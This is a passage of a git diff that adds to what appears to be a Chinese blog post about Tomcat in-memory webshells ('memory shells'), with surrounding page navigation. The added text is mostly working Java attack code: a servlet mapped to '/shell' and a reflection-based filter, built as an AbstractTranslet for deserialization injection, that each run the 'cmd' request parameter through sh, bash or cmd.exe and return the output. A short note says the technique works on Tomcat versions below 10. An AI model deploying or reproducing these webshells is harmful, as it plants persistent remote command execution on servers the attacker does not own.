+                    o.addChild(newWrapper);
+                    //添加servlet的映射
+                    o.addServletMappingDecoded(&quot;/shell&quot;, <span class="hljs-type">name</span>);
+
+                &#125;
+            &#125;
+        &#125; catch (<span class="hljs-keyword">Exception</span> e) &#123;
+            e.printStackTrace();
+        &#125;
+
+    &#125;
+
+    @Override
+    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">transform</span>(DOM document, SerializationHandler[] handlers) throws TransletException &#123;
+
+    &#125;
+
+    @Override
+    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">transform</span>(DOM document, DTMAxisIterator iterator, SerializationHandler <span class="hljs-keyword">handler</span>) throws TransletException &#123;
+
+    &#125;
+
+    @Override
+    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> init(ServletConfig servletConfig) throws ServletException &#123;
+
+    &#125;
+
+    @Override
+    <span class="hljs-built_in">public</span> ServletConfig getServletConfig() &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
+    &#125;
+
+    @Override
+    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;
+        String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+        <span class="hljs-type">boolean</span> isLinux = <span class="hljs-keyword">true</span>;
+        String osTyp = <span class="hljs-keyword">System</span>.getProperty(&quot;os.name&quot;);
+        <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;
+            isLinux = <span class="hljs-keyword">false</span>;
+        &#125;
+        String[] cmds = isLinux ? <span class="hljs-built_in">new</span> String[]&#123;&quot;sh&quot;, &quot;-c&quot;, cmd&#125; : <span class="hljs-built_in">new</span> String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;;
+        InputStream <span class="hljs-keyword">in</span> = Runtime.getRuntime().exec(cmds).getInputStream();
+        Scanner s = <span class="hljs-built_in">new</span> Scanner(<span class="hljs-keyword">in</span>).useDelimiter(&quot;\\a&quot;);
+        String output = s.hasNext() ? s.next() : &quot;&quot;;
+        PrintWriter <span class="hljs-keyword">out</span> = servletResponse.getWriter();
+        <span class="hljs-keyword">out</span>.println(output);
+        <span class="hljs-keyword">out</span>.flush();
+        <span class="hljs-keyword">out</span>.<span class="hljs-keyword">close</span>();
+    &#125;
+
+    @Override
+    <span class="hljs-built_in">public</span> String getServletInfo() &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
+    &#125;
+
+    @Override
+    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> destroy() &#123;
+
+    &#125;
+&#125;</code></pre></div>
+
+<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.catalina.Context;
+<span class="hljs-keyword">import</span> org.apache.catalina.connector.Connector;
+<span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;
+<span class="hljs-keyword">import</span> org.apache.catalina.core.StandardService;
+<span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;
+<span class="hljs-keyword">import</span> org.apache.coyote.AbstractProtocol;
+<span class="hljs-keyword">import</span> org.apache.coyote.Request;
+<span class="hljs-keyword">import</span> org.apache.coyote.RequestGroupInfo;
+<span class="hljs-keyword">import</span> org.apache.coyote.RequestInfo;
+<span class="hljs-keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;
+
+<span class="hljs-keyword">import</span> javax.servlet.*;
+<span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> java.io.InputStream;
+<span class="hljs-keyword">import</span> java.io.PrintWriter;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.lang.reflect.Method;
+<span class="hljs-keyword">import</span> java.util.ArrayList;
+<span class="hljs-keyword">import</span> java.util.Scanner;
+
+<span class="hljs-comment">//@WebFilter(filterName = &quot;testFilter&quot;, urlPatterns = &quot;/*&quot;)</span>
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Filter3</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request1, ServletResponse response1, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;
+        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+            <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> loader.getResources().getContext();
+            <span class="hljs-comment">// 获取 ApplicationContext</span>
+            <span class="hljs-type">Field</span> <span class="hljs-variable">applicationContextField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);
+            applicationContextField.setAccessible(<span class="hljs-literal">true</span>);
+            <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(context);
+            <span class="hljs-comment">// 获取 StandardService</span>
+            <span class="hljs-type">Field</span> <span class="hljs-variable">serviceField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;service&quot;</span>);
+            serviceField.setAccessible(<span class="hljs-literal">true</span>);
+            <span class="hljs-type">StandardService</span> <span class="hljs-variable">standardService</span> <span class="hljs-operator">=</span> (StandardService) serviceField.get(applicationContext);
+
+            <span class="hljs-comment">// 获取 Connector 并筛选 HTTP Connector</span>
+            Connector[] connectors = standardService.findConnectors();
+            <span class="hljs-keyword">for</span> (Connector connector : connectors) &#123;
+                <span class="hljs-keyword">if</span> (connector.getScheme().contains(<span class="hljs-string">&quot;http&quot;</span>)) &#123;
+                    <span class="hljs-comment">// 获取 AbstractProtocol 对象</span>
+                    <span class="hljs-type">AbstractProtocol</span> <span class="hljs-variable">abstractProtocol</span> <span class="hljs-operator">=</span> (AbstractProtocol) connector.getProtocolHandler();
+
+                    <span class="hljs-comment">// 获取 AbstractProtocol$ConnectionHandler</span>
+                    <span class="hljs-type">Method</span> <span class="hljs-variable">getHandler</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getHandler&quot;</span>);
+                    getHandler.setAccessible(<span class="hljs-literal">true</span>);
+                    AbstractEndpoint.<span class="hljs-type">Handler</span> <span class="hljs-variable">ConnectionHandler</span> <span class="hljs-operator">=</span> (AbstractEndpoint.Handler) getHandler.invoke(abstractProtocol);
+
+                    <span class="hljs-comment">// global(RequestGroupInfo)</span>
+                    <span class="hljs-type">Field</span> <span class="hljs-variable">globalField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;global&quot;</span>);
+                    globalField.setAccessible(<span class="hljs-literal">true</span>);
+                    <span class="hljs-type">RequestGroupInfo</span> <span class="hljs-variable">global</span> <span class="hljs-operator">=</span> (RequestGroupInfo) globalField.get(ConnectionHandler);
+
+                    <span class="hljs-comment">// processors (ArrayList)</span>
+                    <span class="hljs-type">Field</span> <span class="hljs-variable">processorsField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;processors&quot;</span>);
+                    processorsField.setAccessible(<span class="hljs-literal">true</span>);
+                    <span class="hljs-type">ArrayList</span> <span class="hljs-variable">processors</span> <span class="hljs-operator">=</span> (ArrayList) processorsField.get(global);
+
+                    <span class="hljs-keyword">for</span> (Object processor : processors) &#123;
+                        <span class="hljs-type">RequestInfo</span> <span class="hljs-variable">requestInfo</span> <span class="hljs-operator">=</span> (RequestInfo) processor;
+                        <span class="hljs-comment">// 依据 QueryString 获取对应的 RequestInfo</span>
+                        <span class="hljs-keyword">if</span> (requestInfo.getCurrentQueryString().contains(<span class="hljs-string">&quot;cmd&quot;</span>)) &#123;
+                            <span class="hljs-type">Field</span> <span class="hljs-variable">reqField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;req&quot;</span>);
+                            reqField.setAccessible(<span class="hljs-literal">true</span>);
+                            <span class="hljs-comment">// org.apache.coyote.Request</span>
+                            <span class="hljs-type">Request</span> <span class="hljs-variable">requestTemp</span> <span class="hljs-operator">=</span> (Request) reqField.get(requestInfo);
+                            <span class="hljs-comment">// org.apache.catalina.connector.Request</span>
+                            org.apache.catalina.connector.<span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (org.apache.catalina.connector.Request) requestTemp.getNote(<span class="hljs-number">1</span>);
+
+                            <span class="hljs-comment">// 执行命令</span>
+                            cmd = request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);
+                            String[] cmds = <span class="hljs-literal">null</span>;
+                            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;
+                                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;
+                                    cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;
+                                &#125; <span class="hljs-keyword">else</span> &#123;
+                                    cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;
+                                &#125;
+                                <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();
+                                <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(inputStream).useDelimiter(<span class="hljs-string">&quot;//A&quot;</span>);
+                                <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;
+                                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> request.getResponse().getWriter();
+                                writer.write(output);
+                                writer.flush();
+                                writer.close();
+
+                                <span class="hljs-keyword">break</span>;
+                            &#125;
+                        &#125;
+                    &#125;
+                &#125;
+            &#125;
+        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+
+        chain.doFilter(request1, response1);
+    &#125;
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;
+
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;
+
+    &#125;
+&#125;</code></pre></div>
+
+<h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p>该方法在tomcat10以下应该是可以通杀的，因为之前用的高版本springBoot，经过测试发现springboot在2.6以后移除了<code>getresources</code>方法</p>
+<h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>很烦，不懂到底什么是无文件，难不成前面的都是有文件的吗</p>
+<p>其次没有利用例子，等下次就算遇到也不知道要用，很烦啊</p>
 
                 
               </div>
@@ -664,6 +1446,12 @@ filterConfigs.put(name, filterConfig);</code></pre></div>
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2024/03/02/spring%E5%86%85%E5%AD%98%E9%A9%AC/" title="spring内存马">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">spring内存马</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
